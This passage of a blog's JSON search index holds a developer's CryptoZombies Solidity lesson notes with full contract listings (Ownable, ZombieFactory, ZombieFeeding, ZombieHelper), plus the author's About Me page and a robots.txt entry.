zombies.push(Zombie(_name, _dna, 1, uint32(now + cooldownTime), 0, 0)) - 1; zombieToOwner[id] = msg.sender; ownerZombieCount[msg.sender]++; emit NewZombie(id, _name, _dna); } function _generateRandomDna(string memory _str) private view returns (uint) { uint rand = uint(keccak256(abi.encodePacked(_str))); return rand % dnaModulus; } function createRandomZombie(string memory _name) public { require(ownerZombieCount[msg.sender] == 0); uint randDna = _generateRandomDna(_name); randDna = randDna - randDna % 100; _createZombie(_name, randDna); } } . zombiefeeding.sol . pragma solidity &gt;=0.5.0 &lt;0.6.0; import &quot;./ownable.sol&quot;; contract ZombieFactory is Ownable { event NewZombie(uint zombieId, string name, uint dna); uint dnaDigits = 16; uint dnaModulus = 10 ** dnaDigits; uint cooldownTime = 1 days; struct Zombie { string name; uint dna; uint32 level; uint32 readyTime; uint16 winCount; uint16 lossCount; } Zombie[] public zombies; mapping (uint =&gt; address) public zombieToOwner; mapping (address =&gt; uint) ownerZombieCount; function _createZombie(string memory _name, uint _dna) internal { uint id = zombies.push(Zombie(_name, _dna, 1, uint32(now + cooldownTime), 0, 0)) - 1; zombieToOwner[id] = msg.sender; ownerZombieCount[msg.sender]++; emit NewZombie(id, _name, _dna); } function _generateRandomDna(string memory _str) private view returns (uint) { uint rand = uint(keccak256(abi.encodePacked(_str))); return rand % dnaModulus; } function createRandomZombie(string memory _name) public { require(ownerZombieCount[msg.sender] == 0); uint randDna = _generateRandomDna(_name); randDna = randDna - randDna % 100; _createZombie(_name, randDna); } } . ownable.sol . pragma solidity &gt;=0.5.0 &lt;0.6.0; /** * @title Ownable * @dev The Ownable contract has an owner address, and provides basic authorization control * functions, this simplifies the implementation of &quot;user permissions&quot;. */ contract Ownable { address private _owner; event OwnershipTransferred( address indexed previousOwner, address indexed newOwner ); /** * @dev The Ownable constructor sets the original `owner` of the contract to the sender * account. */ constructor() internal { _owner = msg.sender; emit OwnershipTransferred(address(0), _owner); } /** * @return the address of the owner. */ function owner() public view returns(address) { return _owner; } /** * @dev Throws if called by any account other than the owner. */ modifier onlyOwner() { require(isOwner()); _; } /** * @return true if `msg.sender` is the owner of the contract. */ function isOwner() public view returns(bool) { return msg.sender == _owner; } /** * @dev Allows the current owner to relinquish control of the contract. * @notice Renouncing to ownership will leave the contract without an owner. * It will not be possible to call the functions with the `onlyOwner` * modifier anymore. */ function renounceOwnership() public onlyOwner { emit OwnershipTransferred(_owner, address(0)); _owner = address(0); } /** * @dev Allows the current owner to transfer control of the contract to a newOwner. * @param newOwner The address to transfer ownership to. */ function transferOwnership(address newOwner) public onlyOwner { _transferOwnership(newOwner); } /** * @dev Transfers control of the contract to a newOwner. * @param newOwner The address to transfer ownership to. */ function _transferOwnership(address newOwner) internal { require(newOwner != address(0)); emit OwnershipTransferred(_owner, newOwner); _owner = newOwner; } } .",
            "url": "https://saxenism.com/web3/solidity/cryptozombies/beginner/2021/06/15/CryptoZombies-Lesson-4.html",
            "relUrl": "/web3/solidity/cryptozombies/beginner/2021/06/15/CryptoZombies-Lesson-4.html",
            "date": " • Jun 15, 2021"
        }
        
    
  
    
        ,"post21": {
            "title": "CryptoZombies - Lesson 3",
            "content": "Lesson 3: . After you deploy a contract to Ethereum, it is immutable. It can never be modified/updated again. For this reason, if often makes sense to have functions that will allow you to update key portions of your dApp | Ownable contract: Owners(contract creators) have special priviliges. It has the following three functions: a. When a contract is deployed, its constructor sets the owner to msg.sender (the person who deployed it) b. It adds an onlyOwner modifier, which can restirct access to certain functions to only the owner c. It allows you to transfer the contract to a new owner | Once you inherit from the Ownable contract, you can use the onlyOwner function modifier. This ensures that the function caller is indeed the contract owner or not | In Solidity, your users have to pay every time they execute a function on your DApp using a currency called gas. So, basically, users have to spend ETH in order to execute functions on your DApp. | How much gas is required to execute a function depends on how complex that function’s logic is. Each individual operation has a gas cost based roughly on how much computing resources will be required to perform that operation. The total gas cost of your function is the sum of the gas costs of all its individual operations. Therefore, code optimization is much much more important in Ethereum than in other programming languages. Because, if your code is slopp, then your users are going to pay a premium to execute your functions – and this could add up to millions of dollars in unnecessary fees across thousand of users. | Choosing either of uint8, uint16, uint32, uint256 will result in the same gas fee because Ethereum reserves the same space for each, irrespective of what uint you choose. But you can save on costs when working with multiple uints inside of a struct. Also, for this to happen, you would want to cluster identical data types together (ie put them next to each other in the struct) | Solidity provides some native units for dealing with time. The variable now will return the current unix timestamp of the latest block (the number of seconds that have passed since January 1st 1970). Solidity also contains the time units seconds, minutes, hours, days, weeks and years. | We can pass a storage pointer to a struct as an argument to a private or internal function. | An important security practice is to examine all your public and external functions, and try to think of ways users might abuse them. Because, unless these functions have a modifier like onlyOwner, any user can call them and pass them any data they want to. | The custom function modifier (like onlyOwner) can also take some parameters. The following example will clear things up: mapping (uint =&gt; uint) public age; // Modifier that requires this user to be older than a certain age: modifier olderThan(uint _age, uint _userId) { require(age[_userId] &gt;= _age); _; } function driveCar(uint _userId) public olderThan(16, _userId) { // Some function logic } . | Remember how we used memory pointer type along with string in function parameters. Similar to memory we have calldata but it’s only available to external functions | Since view functions only needs to query your local Ethereum node to run the function, it doesn’t actually have to create a transaction on the blockchain, which would need to run on every single node, and cost gas. Therefore, view functions don’t cost any gas when they’re called externally by a user. Optimize your DApp’s gas usage for your users by using read-only external view functions wherever possible. If a view function is called internally from another function in the same contract that is not a view function, it will still cost gas. This is because the other function creates a transaction on Ethereum, and will still need to be verified from every node. So view functions are only free when they’re called externally. | One of the more expensive operations in Solidity is using storage — particularly writes. This is because every time you write or change a piece of data, it’s written permanently to the blockchain. Forever! Thousands of nodes across the world need to store that data on their hard drives, and this amount of data keeps growing over time as the blockchain grows. So there’s a cost to doing that. In order to keep costs down, you want to avoid writing data to storage except when absolutely necessary. Sometimes this involves seemingly inefficient programming logic — like rebuilding an array in memory every time a function is called instead of simply saving that array in a variable for quick lookups. In most programming languages, looping over large data sets is expensive. But in Solidity, this is way cheaper than using storage if it’s in an external view function, since view functions don’t cost your users any gas. (And gas costs your users real money!). An example illustrating how to declare arrays in memory: function getArray() external pure returns(uint[] memory) { // Instantiate a new array in memory with a length of 3 uint[] memory values = new uint[](3); // Put some values to it values[0] = 1; values[1] = 2; values[2] = 3; return values; } . | for loops will be preferred over mapping solutions, if it can save gas cost. | . Solidity Code from Lesson 3: . ##ownable.sol . pragma solidity &gt;=0.5.0 &lt;0.6.0; /** * @title Ownable * @dev The Ownable contract has an owner address, and provides basic authorization control * functions, this simplifies the implementation of &quot;user permissions&quot;. */ contract Ownable { address private _owner; event OwnershipTransferred( address indexed previousOwner, address indexed newOwner ); /** * @dev The Ownable constructor sets the original `owner` of the contract to the sender * account. */ constructor() internal { _owner = msg.sender; emit OwnershipTransferred(address(0), _owner); } /** * @return the address of the owner. */ function owner() public view returns(address) { return _owner; } /** * @dev Throws if called by any account other than the owner. */ modifier onlyOwner() { require(isOwner()); _; } /** * @return true if `msg.sender` is the owner of the contract. */ function isOwner() public view returns(bool) { return msg.sender == _owner; } /** * @dev Allows the current owner to relinquish control of the contract. * @notice Renouncing to ownership will leave the contract without an owner. * It will not be possible to call the functions with the `onlyOwner` * modifier anymore. */ function renounceOwnership() public onlyOwner { emit OwnershipTransferred(_owner, address(0)); _owner = address(0); } /** * @dev Allows the current owner to transfer control of the contract to a newOwner. * @param newOwner The address to transfer ownership to. */ function transferOwnership(address newOwner) public onlyOwner { _transferOwnership(newOwner); } /** * @dev Transfers control of the contract to a newOwner. * @param newOwner The address to transfer ownership to. */ function _transferOwnership(address newOwner) internal { require(newOwner != address(0)); emit OwnershipTransferred(_owner, newOwner); _owner = newOwner; } } . zombiefactory.sol . pragma solidity &gt;=0.5.0 &lt;0.6.0; import &quot;./ownable.sol&quot;; contract ZombieFactory is Ownable { event NewZombie(uint zombieId, string name, uint dna); uint dnaDigits = 16; uint dnaModulus = 10 ** dnaDigits; uint cooldownTime = 1 days; struct Zombie { string name; uint dna; uint32 level; uint32 readyTime; } Zombie[] public zombies; mapping (uint =&gt; address) public zombieToOwner; mapping (address =&gt; uint) ownerZombieCount; function _createZombie(string memory _name, uint _dna) internal { uint id = zombies.push(Zombie(_name, _dna, 1, uint32(now + cooldownTime))) - 1; zombieToOwner[id] = msg.sender; ownerZombieCount[msg.sender]++; emit NewZombie(id, _name, _dna); } function _generateRandomDna(string memory _str) private view returns (uint) { uint rand = uint(keccak256(abi.encodePacked(_str))); return rand % dnaModulus; } function createRandomZombie(string memory _name) public { require(ownerZombieCount[msg.sender] == 0); uint randDna = _generateRandomDna(_name); randDna = randDna - randDna % 100; _createZombie(_name, randDna); } } . zombiefeeding.sol . pragma solidity &gt;=0.5.0 &lt;0.6.0; import &quot;./zombiefactory.sol&quot;; contract KittyInterface { function getKitty(uint256 _id) external view returns ( bool isGestating, bool isReady, uint256 cooldownIndex, uint256 nextActionAt, uint256 siringWithId, uint256 birthTime, uint256 matronId, uint256 sireId, uint256 generation, uint256 genes ); } contract ZombieFeeding is ZombieFactory { KittyInterface kittyContract; function setKittyContractAddress(address _address) external onlyOwner { kittyContract = KittyInterface(_address); } function _triggerCooldown(Zombie storage _zombie) internal { _zombie.readyTime = uint32(now + cooldownTime); } function _isReady(Zombie storage _zombie) internal view returns (bool) { return (_zombie.readyTime &lt;= now); } function feedAndMultiply(uint _zombieId, uint _targetDna, string memory _species) internal { require(msg.sender == zombieToOwner[_zombieId]); Zombie storage myZombie = zombies[_zombieId]; require(_isReady(myZombie)); _targetDna = _targetDna % dnaModulus; uint newDna = (myZombie.dna + _targetDna) / 2; if (keccak256(abi.encodePacked(_species)) == keccak256(abi.encodePacked(&quot;kitty&quot;))) { newDna = newDna - newDna % 100 + 99; } _createZombie(&quot;NoName&quot;, newDna); _triggerCooldown(myZombie); } function feedOnKitty(uint _zombieId, uint _kittyId) public { uint kittyDna; (,,,,,,,,,kittyDna) = kittyContract.getKitty(_kittyId); feedAndMultiply(_zombieId, kittyDna, &quot;kitty&quot;); } } . zombiehelper.sol . pragma solidity &gt;=0.5.0 &lt;0.6.0; import &quot;./zombiefeeding.sol&quot;; contract ZombieHelper is ZombieFeeding { // 1. Define levelUpFee here modifier aboveLevel(uint _level, uint _zombieId) { require(zombies[_zombieId].level &gt;= _level); _; } // 2. Insert levelUp function here function changeName(uint _zombieId, string calldata _newName) external aboveLevel(2, _zombieId) { require(msg.sender == zombieToOwner[_zombieId]); zombies[_zombieId].name = _newName; } function changeDna(uint _zombieId, uint _newDna) external aboveLevel(20, _zombieId) { require(msg.sender == zombieToOwner[_zombieId]); zombies[_zombieId].dna = _newDna; } function getZombiesByOwner(address _owner) external view returns(uint[] memory) { uint[] memory result = new uint[](ownerZombieCount[_owner]); uint counter = 0; for (uint i = 0; i &lt; zombies.length; i++) { if (zombieToOwner[i] == _owner) { result[counter] = i; counter++; } } return result; } } .",
            "url": "https://saxenism.com/web3/solidity/cryptozombies/beginner/2021/06/14/CryptoZombies-Lesson-3.html",
            "relUrl": "/web3/solidity/cryptozombies/beginner/2021/06/14/CryptoZombies-Lesson-3.html",
            "date": " • Jun 14, 2021"
        }
        
    
  
    
        ,"post22": {
            "title": "CryptoZombies - Lesson 2",
            "content": "Lesson 2: . Addresses: The ethereum blockchain is made up of accounts, which you can think of as bank accounts. An account has a balance of Ether, and you can send and recieve Ether payments to other accounts, just like your bank account can wire transfer money to other bank accounts Each bank account has an address which you can think of like a bank account number.Its a unique identifier that points to an account. An address is owned by a specific user or a smart contract. Mapping: So we can use it as a unique ID for ownership of our zombies. When a user creates new zombies by interacting with our app, we’ll set ownership of those zombies to the Ethereum address that called the function A mapping is essentially a key-value store for storing and looking up data mapping(uint =&gt; string) userIdToName; | msg.sender In solidity, there are certain global variables that are available to all functions. One of them is msg.sender msg.sender refers to the address of the person (or the smart contract) who called the current function In solidity, function execution always needs to start with an external caller. A contract will just sit on the blockchain doing nothing until someone calls one of its functions. So, there will always be a msg.sender | require is a keyword in Solidity used for condition checking. If this condition is met, then only a function is executed otherwise, it terminates with an error. Example: function sayHiToVitalik (string memory _name) public returns (string memory) { require(keccak256(abi.encodePacked(_name)) == keccak256(abi.encodePacked(&quot;Vitalik&quot;))); return &quot;Hi Vitalik, thank you for Ethereum!!&quot;; } . | Solidity does not support string comparison natively, so we simply compare the keccak256 hashes of the two strings. | Solidity supports inheritence. Hence, instead of writing one big long contract, it makes sense to split your code logic across multiple contracts to organize the code. | Really cool and succint inheritence syntax: contract cat is animal { } // Here the contract cat inherits from the contract animal :D . | Syntax to import one file into another: import &#39;./someOtherContract.sol&#39;; contract newContract is someOtherContract { } . | In solidity, there are two locations in which you can store variables - in storage and in memory. Storage refers to variables permanently stored on the blockchain. Memory variables are temporary, and are erased between external function calls to your contract. Think of it like a computer’s Hard Disk vs RAM Example: contract SandwichFactory { struct Sandwich { string name; string status; } Sandwich[] sandwiches; function eatSandwich(uint _index) public { // Sandwich mySandwich = sandwiches[_index]; // ^ Seems pretty straightforward, but solidity will give you a warning // telling you that you should explicitly declare storage or memory here. // So instead, you should declare with the storage keyword, like: Sandwich storage mySandwich = sandwiches[_index]; // ...in which case mySandwich is a pointer to sandwiches[_index] // in storage, and... mySandwich.status = &quot;Eaten!&quot;; // ...this will permanently change `sandwiches[_index]` on the blockchain. // If you just want a copy, you can use memory: Sandwich memory anotherSandwich = sandwiches[_index + 1]; // ...in which case anotherSandwich will simply be a copy of the // data in memory, and... anotherSandwich.status = &quot;Eaten!&quot;; // ...will just modify the temporary variable and have no effect // on sandwiches[_index + 1]. But you can do this: sandwiches[_index + 1] = anotherSandwich; // ...if you want to copy the changes back into blockchain storage. } } . | For a struct People such as: struct People { string name; uint age; } People randomMan = People(&quot;Sam&quot;, &quot;22&quot;); . You can access the properties of this struct as follows: randomMan.age or randomMan.name . | Types of functions in solidity: a. Private b. Internal c. Public d. External internal is the same as private, except that it’s also accessible to contracts that inherit from this contract. external is the same public, except that these functions can ONLY be called outside the contract. | Interacting with other smart contracts on the Ethereum blockchain: a. Define an interface (almost the same syntax as that of a contract, but only function signatures are mentioned here.) b. Only those function signatures need to be written in the interface, that we actually need to call c. Grab the address of the smart contract, you want to call the function from d. Initialise the interface you built with this address (much like creating an object) e. Example: contract NumberInterface { function getNum(address _myAddress) public view returns (uint); } contract MyContract { address NumberInterfaceAddress = 0xabcde122...... NumberInterface numberContract = NumberInterface(NumberInterfaceAddress); function someFunction() public { uint num = numberContract.getNum(msg.sender); } } . | In Solidity you can return more than one value from a function :D | This example illustrates, how we manage multiple return values from Solidity function: function multipleReturns() internal returns(uint a, uint b, uint c) { return (1, 2, 3); } function processMultipleReturns() external { uint a; uint b; uint c; // This is how you do multiple assignment: (a, b, c) = multipleReturns(); } // Or if we only cared about one of the values: function getLastReturnValue() external { uint c; // We can just leave the other fields blank: (,,c) = multipleReturns(); } . . | Solidity code from Lesson2 . zombiefactory.sol . pragma solidity &gt;= 0.8.4; contract ZombieFactory { event NewZombie(uint zombieId, string name, uint dna); uint dnaDigits = 16; uint dnaModulus = 10 ** dnaDigits; //(10^16) struct Zombie { string name; uint dna; } Zombie[] public zombies; mapping (uint =&gt; address) public zombieToOwner; mapping (address =&gt; uint) ownerZombieCount; function _createZombie(string memory _name, uint _dna) internal { zombies.push(Zombie(_name, _dna)); uint id = zombies.length - 1; zombieToOwner[id] = msg.sender; ownerZombieCount[msg.sender]++; emit NewZombie(id, _name, _dna); } function _generateRandomDna(string memory _str) private view returns (uint) { uint rand = uint(keccak256(abi.encodePacked(_str))); return rand % dnaModulus; } function createRandomZombie(string memory _name) public { require(ownerZombieCount[msg.sender] == 0); uint randDna = _generateRandomDna(_name); randDna = randDna - randDna % 100; _createZombie(_name, randDna); } } . zombiefeeding.sol . pragma solidity ^ 0.8.4; import &quot;lesson2_zombiefactory.sol&quot;; contract KittyInterface { function getKitty(uint256 _id) external view returns ( bool isGestating, bool isReady, uint256 cooldownIndex, uint256 nextActionAt, uint256 siringWithId, uint256 birthTime, uint256 matronId, uint256 sireId, uint256 generation, uint256 genes ); } contract ZombieFeeding is ZombieFactory { address ckAddress = 0x06012c8cf97BEaD5deAe237070F9587f8E7A266d; KittyInterface kittyContract = KittyInterface(ckAddress); function feedAndMultiply(uint _zombieId, uint _targetDna, string memory _species) public { require(msg.sender == zombieToOwner[_zombieId]); Zombie storage myZombie = zombies[_zombieId]; _targetDna = _targetDna % dnaModulus; uint newDna = (myZombie.dna + _targetDna) / 2; if (keccak256(abi.encodePacked(_species)) == keccak256(abi.encodePacked(&quot;kitty&quot;))) { newDna = newDna - newDna % 100 + 99; } _createZombie(&quot;NoName&quot;, newDna); } function feedOnKitty(uint _zombieId, uint _kittyId) public { uint kittyDna; (,,,,,,,,,kittyDna) = kittyContract.getKitty(_kittyId); feedAndMultiply(_zombieId, kittyDna, &quot;kitty&quot;); } } .",
            "url": "https://saxenism.com/web3/solidity/cryptozombies/beginner/2021/06/13/CryptoZombies-Lesson-2.html",
            "relUrl": "/web3/solidity/cryptozombies/beginner/2021/06/13/CryptoZombies-Lesson-2.html",
            "date": " • Jun 13, 2021"
        }
        
    
  
    
        ,"post23": {
            "title": "CryptoZombies - Lesson 1",
            "content": "Lesson 1: . Solidity code is encapsulated in contracts. A contract is the fundamental building block of Ethereum applications. All variables and functions belong to a contract and this will be the starting point of all projects | State Variables: Permanently stored in contract storage (they are written to the Ethereum Blockchain) Think of declaring state variables like writing to a DB | Arithmetic operations: x+y, x-y, x*y, x/y, x%y, x**y(same as x^y) | structs struct Person { uint age; string name; } . | Arrays {Possible to create an array of structs as well as native data types} Fixed arrays -&gt; uint [2] fixedArr Dynamic arrays -&gt; uint [] dynamicArr If an array is declared as public, other contracts can read from but not write to this array | function createZombies (string memory _name, uint _dna) public { underscore is a naming convention to separate the private variables from the global variables(_name) } . Notice the word memory along with the string parameter, it signifies that _name would be memory and not in stack, therefore would not be written to the blockchain, hence cheaper The memory keyword is required for reference type varialbles: arrays, structs, mapping, strings, etc. . | Pushing to the array: Person Satoshi = Person(172, &quot;Satoshi&quot;); people.push(Satoshi); . | In solidity, all functions are public by default. Good practice is to intially make all the functions private and then only make public the functions you want to expost to the world Convetion to start private functions with underscore (function _generateZombieID()) | Return values function sayHello() public returns (string memory) { } . If a function does not change any values, we can term it as a view function. [function sayHello() public view returns (string memory) {}] Pure functions =&gt; not accessing any data from the contract. . | Keccak256 and typecasting: Ethereum has the hash function keccak 256 built-in, which is a version of SHA3. keccak256 expects a single parameter of type bytes This means we have to “pack” any parameter before calling keccak256 | Compiler supports typecasting var = uint8(var) =&gt; This shit | Events are a way for your contract to communicate to your app front-end that something has happened on the blockchain, which can be listening for certain events and take actions when they happen Example declaration: event IntegersAdded(uint x, uint y, uint result); //Include input and ouputs to a function function add(uint _x, uint _y) public returns (uint) { uint result = _x + _y; emit IntegersAdded(_x, _y, result); return result; } . | . Solidity code from Lesson 1 . pragma solidity ^ 0.8.0; contract ZombieWorld { event NewZomie(uint zombieId, string name, uint dna); uint dnaDigits = 16; uint dnaModulus = 10 ** dnaDigits; struct Zombie { string name; uint dna; } Zombie[] public zombies; function _createZombie(string memory _name, uint _dna) private { zombies.push(Zombie(_name, _dna)); uint id = zombies.length - 1; emit NewZomie(id, _name, _dna); } function _generateRandomDna(string memory _str) private view returns (uint) { uint rand = uint(keccak256(abi.encodePacked(_str))); return rand % dnaModulus; } function createRandomZombie(string memory _name) public { uint randDna = _generateRandomDna(_name); _createZombie(_name, randDna); } } .",
            "url": "https://saxenism.com/web3/solidity/cryptozombies/beginner/2021/06/12/Cryptozombies-Lesson-1.html",
            "relUrl": "/web3/solidity/cryptozombies/beginner/2021/06/12/Cryptozombies-Lesson-1.html",
            "date": " • Jun 12, 2021"
        }
        
    
  

  
  

  
      ,"page1": {
          "title": "About Me",
          "content": "Blockchain Engineer &amp; Consultant . A curious tinkerer, madly in love with the decentralised universe . Follow on LinkedIn . A few things about me: . (Ex) Full-Stack Blockchain engineer @ sublime.finance | Consulted with a decentralised freelancing platform. Took the project from idea to contract deployment :P | Winner @ NFTHack2022 under Best use of Harmony NFT bridge | Winner of Creator Track @ Solana Building Out Loud hackathon | Ethereum India Fellow (v 2.0) under Track 1 | Solana Global Breakpoint Fellow @ Lisbon 2021 | Runner Up @ EtherPunk 2021. Awarded SuperFluid bounties | Won Filecoin,Polygon,NFTPort,Covalent,Livepeer &amp; Sublime prizes | Experienced with serverless development (Cloudflare) and twitter APIs | Authored Solana Anchor tutorials promoted by Solana Labs itself | Creating educational blockchain development tutorials | Mentor @ Sublime Finance in the ETHOnline 2021 hackathon | GSoC ‘21 &amp; ‘20 student dev with the R Project | Research Paper @ Biodiversity Information Science &amp; Standards. Link to paper | Azure AZ-900 certified cloud guy &gt;.&lt; | Published tech-author with leading Medium publications | Mentoring 200+ budding developers and helping navigate OSS | Multiple deployed MERN-stack and Flutter projects | Cyber Security Awareness speaker for CDAC and ISEA | Co-founder: Information Security Society of IIIT Bhubaneswar | Trained 250+ students in basics of cyber security | . Hit me up (on Twitter preferably) if you want to work with me or simply want to discuss why Black Clover is a GOATED modern-day classic. . See you around. .",
          "url": "https://saxenism.com/about/",
          "relUrl": "/about/",
          "date": ""
      }
      
  

  

  
  

  

  
  

  

  
  

  
  

  

  

  
  

  
      ,"page12": {
          "title": "",
          "content": "Sitemap: {{ “sitemap.xml” | absolute_url }} | .",
          "url": "https://saxenism.com/robots.txt",
          "relUrl": "/robots.txt",
          "date": ""
      }
      
  

}